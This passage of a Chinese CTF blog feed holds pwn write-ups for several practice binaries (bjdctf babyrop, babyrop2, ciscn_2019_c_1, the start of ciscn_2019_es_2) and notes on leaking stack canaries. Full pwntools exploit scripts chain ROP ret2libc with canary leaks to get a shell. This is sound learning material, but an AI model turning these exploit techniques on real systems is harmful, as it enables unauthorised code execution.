<pre class="line-numbers language-python" data-language="python"><code class="language-python">ROPgadget <span class="token operator">-</span><span class="token operator">-</span>binary bjdctf_2020_babyrop <span class="token operator">|</span>grep <span class="token string">"pop rdi"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/image-20210626122850728.png" alt="image-20210626122850728"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'pull up your sword and tell me u story!'</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
puts_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
libc<span class="token operator">=</span>LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后计算偏移量，算出system和/bin/sh的地址</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">offset<span class="token operator">=</span>puts_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>
system<span class="token operator">=</span>offset<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
bin_sh<span class="token operator">=</span>offset<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>最后构造rop，夺权</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'pull up your sword and tell me u story!'</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>

r<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">25680</span><span class="token punctuation">)</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">/</span>bjdctf_2020_babyrop'<span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
        
main<span class="token operator">=</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>
puts_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
puts_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
pop_rdi<span class="token operator">=</span><span class="token number">0x400733</span>
        
payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'pull up your sword and tell me u story!'</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
puts_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
libc<span class="token operator">=</span>LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>
        
offset<span class="token operator">=</span>puts_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>
system<span class="token operator">=</span>offset<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
bin_sh<span class="token operator">=</span>offset<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>
        
payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'pull up your sword and tell me u story!'</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
        
r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最后拿到flag</p>
<p><img src="/img/image-20210626130027859.png" alt="image-20210626130027859"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>bjdctf_2020_babyrop2</title>
    <url>/2021/0718814e.html</url>
    <content><![CDATA[<h1 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h1><p>检查保护机制，开了NX和canary，64位</p>
<p><img src="/img/image-20210718104136221.png" alt="image-20210718104136221"></p>
<p>IDA打开，查看main函数，发现里面利用到了三个函数</p>
<p><img src="/img/image-20210718104243834.png" alt="image-20210718104243834"></p>
<p>init函数，初始化输出提示</p>
<p><img src="/img/image-20210718104312978.png" alt="image-20210718104312978"></p>
<p>gift函数，存在格式化字符串漏洞</p>
<p><img src="/img/image-20210718104333802.png" alt="image-20210718104333802"></p>
<p>vuln函数，存在栈溢出漏洞</p>
<p><img src="/img/image-20210718104359430.png" alt="image-20210718104359430"></p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><h5 id="可利用gift函数的格式化字符串漏洞，泄露canary的值"><a href="#可利用gift函数的格式化字符串漏洞，泄露canary的值" class="headerlink" title="可利用gift函数的格式化字符串漏洞，泄露canary的值"></a>可利用<code>gift</code>函数的格式化字符串漏洞，泄露<code>canary</code>的值</h5><p>得到偏移量为7</p>
<p><img src="/img/20200826223512973.png"></p>
<p>没有发现system和’/bin/sh’，只有通过vuln函数栈溢出漏洞，泄露libc地址，然后得到</p>
<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">"linux"</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">"amd64"</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span> <span class="token string">"debug"</span><span class="token punctuation">)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">27304</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./bjdctf_2020_babyrop2"</span><span class="token punctuation">)</span>

puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
vuln_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"vuln"</span><span class="token punctuation">]</span>
pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x400993</span>

payload <span class="token operator">=</span> <span class="token string">b"%7$p"</span>
p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"u!"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>
canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">8</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>vuln_addr<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"story!"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">,</span> puts_addr<span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">)</span>
system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span>
binsh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"str_bin_sh"</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">8</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"story!"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"cat flag"</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/img/image-20210718110410868.png" alt="image-20210718110410868"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>blog诞生日2021.6.17</title>
    <url>/2021/0617fe90.html</url>
    <content><![CDATA[<span id="more"></span>
<p>经过一下午不懈的努力，我终于在2021年6月17日下午17：30成功搭建了我的博客，在这发文纪念一下！<br><img src="/img/%E8%AF%9E%E7%94%9F%E6%97%A5.jpg"></p>
]]></content>
      <categories>
        <category>日常闲话</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>canary</title>
    <url>/2021/12202f1c.html</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>由于canary保护就是在距离EBP一定距离的栈帧中，用于验证是否程序有构造缓冲区的危险。而canary所在的位置一般也都在EBP-8的位置上存储着，因此 只要有机会泄露canary的位置，我们便有机会溢出程序</p>
<h1 id="泄露方式"><a href="#泄露方式" class="headerlink" title="泄露方式"></a>泄露方式</h1><h2 id="覆盖00字节读取"><a href="#覆盖00字节读取" class="headerlink" title="覆盖00字节读取"></a>覆盖00字节读取</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>由于canary是在栈中的，而一般情况下为防止read、printf等函数直接读出canary的数据，canary都是以<code>\x00</code>为结尾设计的。这时我们可以利用换行符在将buf填充满之后会将<code>\x0a</code>覆盖至canary结尾的<code>\x00</code>覆上，这样就能顺利的读出canary的数据了，之后再将<code>cannary</code>-<code>\x0a</code>即可得到真实的canary的数据</p>
<p><img src="/img/1643119852338.png" alt="1643119852338"></p>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
<li>存在<code>read</code>/<code>printf</code>等读出字符串的函数 </li>
<li>可以两次栈溢出 </li>
<li><ul>
<li><strong>第一次是覆盖00字节，泄露canary</strong></li>
<li><strong>第二次是利用canary进行攻击</strong></li>
</ul>
</li>
</ul>
<h2 id="格式化字符串读取"><a href="#格式化字符串读取" class="headerlink" title="格式化字符串读取"></a>格式化字符串读取</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>利用格式化字符串漏洞的任意读</p>
<p>由于canary的最低字节是0x00，所以不能用%s的格式当作字符串来读，而应该使用<code>%p</code>或者<code>%x</code>等当作一个数来读</p>
<p>从栈的情况看，var_8(即canary的值)距离栈顶n个字节，n/8   =x，64位Linux前六个参数用寄存器传递，后面的才从栈上读取，所以要使var_8是printf函数的第x+7个参数，因此使用“(x+6)$p”作为printf参数可以泄露出canary的值。</p>
<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p><strong>存在格式化字符串漏洞</strong></p>
<h3 id="知识点补充："><a href="#知识点补充：" class="headerlink" title="知识点补充："></a>知识点补充：</h3><p>%i$p是指打印出偏移format第i个参数的值</p>
<h2 id="One-by-one-爆破猜解"><a href="#One-by-one-爆破猜解" class="headerlink" title="One by one 爆破猜解"></a>One by one 爆破猜解</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>对于canary，虽然每次进程重启后canary会不同，但是同一个进程中的不同线程的canary却是相同的，并且通过<strong>fork</strong>函数创建的子进程中的canary也是相同的，因为<strong>fork函数会直接拷贝父进程的内存</strong></p>
<p>最低位为0x00,之后逐位爆破，<strong>因此32位的话要循环3次、64位的则需要循环7次</strong>，每次从ascii码中取。</p>
<p>如果某一位爆破成功 <strong>如<code>\x00\xXX</code>将会覆盖当前的canary末尾的这两位，使之程序认为这便是原有的canary，所以程序会继续运行</strong>，反之则会报错，由此来判断是否爆破成功（这里 愚钝的我思考了很久很久…）。</p>
<h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><p>要求程序中有<code>fork</code>函数，可以使程序扩展子程序<del>(暂时还没遇到过)</del></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn_2019_c_1</title>
    <url>/2021/062848a4.html</url>
    <content><![CDATA[<h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><p>检查保护机制，64位，开NX</p>
<p><img src="/img/image-20210429213629885.png" alt="image-20210429213629885"></p>
<p>IDA打开后F5查看main函数</p>
<p><img src="/img/image-20210423214542261.png" alt="image-20210423214542261"></p>
<p>发现没有之前做的gets()栈溢出，但是发现了一个encrypt函数，点开之后查看，找到了gets函数</p>
<p><img src="/img/image-20210423214700799.png" alt="image-20210423214700799"></p>
<p>读得内容为gets读取输入内容进入while循环之后是由strlen检查长度，strlen是从字符串开头检测到第一个\x00截断，所以只要在payload的开头置0让strlen判断错误就可以避免对payload的破坏。</p>
<h4 id="小技巧-遇到strlen和strcmp这两个只需要在payload里放一个-x00就可以绕过"><a href="#小技巧-遇到strlen和strcmp这两个只需要在payload里放一个-x00就可以绕过" class="headerlink" title="小技巧:遇到strlen和strcmp这两个只需要在payload里放一个\x00就可以绕过"></a>小技巧:遇到strlen和strcmp这两个只需要在payload里放一个\x00就可以绕过</h4><p>但这里没有发现后门函数，于是只能自己构造rop链。</p>
<p>puts()可以用来泄露libc基址。</p>
<p>gets()可以用来栈溢出，栈大小0x50。</p>
<p><img src="/img/image-20210430234840983.png" alt="image-20210430234840983"></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>

content <span class="token operator">=</span> <span class="token number">0</span>
context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

ret <span class="token operator">=</span> <span class="token number">0x4006b9</span>      
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'ciscn_2019_c_1'</span><span class="token punctuation">)</span>

puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span> 
puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span>

pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x400c83</span>      <span class="token comment">#×64程序基本都存在的一个地址pop rdi；ret</span>


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
		p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'ciscn_2019_c_1'</span><span class="token punctuation">)</span>
	<span class="token keyword">else</span><span class="token punctuation">:</span>	
		p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">29999</span><span class="token punctuation">)</span>

	payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x50</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>
	payload <span class="token operator">=</span> payload <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>

	p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Input your choice!\n'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
	p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Input your Plaintext to be encrypted\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

	p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Ciphertext\n'</span><span class="token punctuation">)</span>	
	p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
	puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>      <span class="token comment">#找出puts的地址</span>

	libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span> puts_addr<span class="token punctuation">)</span>

	libc_base   <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>      <span class="token comment">#找出函数地址偏移量</span>
	system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>      <span class="token comment">#计算出system的在程序中的地址</span>
	binsh_addr  <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>	

	payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x50</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>
	payload <span class="token operator">=</span> payload <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>

	p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Input your choice!\n'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
	p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Input your Plaintext to be encrypted\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

	p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

main<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>cat flag</p>
<p><img src="/img/image-20210501002359709.png" alt="image-20210501002359709"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn_2019_es_2</title>
    <url>/2021/06284f25.html</url>
    <content><![CDATA[<h1 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h1><p>检查保护机制，32位，开启NX</p>
<p><img src="/img/image-20210628215206342.png" alt="image-20210628215206342"></p>
<p>IDA打开，shift+F12查找字符串，发现sysytem函数，但没有/bin/sh，还是无法直接利用</p>
<p><img src="/img/image-20210628215304461.png" alt="image-20210628215304461"></p>
<p>找到system函数真实地址0x8048400</p>
<p><img src="/img/image-20210628215541204.png" alt="image-20210628215541204"></p>
<p>main函数，还是一样，里面的vlu()函数肯定是重点</p>
<p><img src="/img/image-20210628215636474.png" alt="image-20210628215636474"></p>
<p><img src="/img/image-20210628215644207.png" alt="image-20210628215644207"></p>
<p>读入0x30字节数据给s，s大小是0x28，只能溢出0x8字节，覆盖到ret，没法构造太长的rop，但是这边可以给s写入2次数据。</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>我们可以通过第一次输入来泄露程序里的ebp地址，知道了ebp的地址就能够推算出参数s在栈上的地址，第二次直接往栈上写入system（‘/bin/sh’），之后利用leave；ret的栈劫持去到参数s的栈，让它去执行我们布置在栈上的system（‘/bin/sh’）来获取shell。</p>
<h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><p>1.泄露ebp</p>
<p>printf函数在输出时遇到’\0’会停止，若将s填满，这样在末尾就无法加上’\0’，就可以泄露ebp了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x27</span><span class="token operator">+</span><span class="token string">'b'</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span>
ebp<span class="token operator">=</span>u32<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>2.找到s在栈上的位置</p>
<p>算出ebp-0x38是参数s在栈上的位置</p>
<p>3.布置栈上的值</p>
<p><img src="/img/image-20210628221147958.png" alt="image-20210628221147958"></p>
